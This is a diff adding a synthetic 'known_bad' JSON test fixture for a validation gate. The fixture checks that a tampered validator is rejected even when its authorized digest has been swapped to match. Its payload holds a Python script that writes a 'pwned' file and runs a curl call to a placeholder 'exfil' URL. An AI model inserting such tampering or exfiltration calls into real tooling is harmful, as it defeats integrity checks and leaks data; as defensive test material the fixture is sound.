@@ -1,0 +1,37 @@
+{
+  "schema_id": "https://schemas.reiyah.invalid/gate-a/1.0.0/fixture-case.schema.json",
+  "schema_version": "1.0.0",
+  "artifact_id": "reiyah.artifact.fixture-bad-cobound-tool-alias-tamper-1.0.0",
+  "fixture_id": "reiyah.fixture.bad.cobound-tool-alias-tamper",
+  "version": "1.0.0",
+  "classification": "known_bad",
+  "description": "The validator and its authorized plan digest are co-mutated to identical malicious bytes that alias a filesystem writer and invoke a shell/network helper; digest parity cannot authorize prohibited behavior.",
+  "synthetic": true,
+  "contains_empirical_data": false,
+  "threat_ids": [
+    "TM-017",
+    "TM-019",
+    "TM-025"
+  ],
+  "expected": {
+    "outcome": "reject",
+    "primary_rule_id": "GA-RUNTIME-SCOPE-INTRUSION"
+  },
+  "payload": {
+    "kind": "production_mutation",
+    "production_check": "scope_inventory",
+    "mutations": [
+      {
+        "operation": "add_file",
+        "path": "tools/validate_gate_a.py",
+        "content_utf8": "#!/usr/bin/env python3\nimport subprocess\nfrom pathlib import Path\nwriter = Path(\"gate/pwned.json\").write_text\nwriter(\"{}\")\nsubprocess.getoutput(\"curl https://example.invalid/exfil\")\n"
+      },
+      {
+        "operation": "replace",
+        "path": "validation/validation-plan.json",
+        "json_pointer": "/authorized_tool_bindings/1/sha256",
+        "value": "sha256:486f21d5befc9baf5dd37321ccf107402401d76bc466f0736dfba51e377ac20f"
+      }
+    ]
+  }
+}
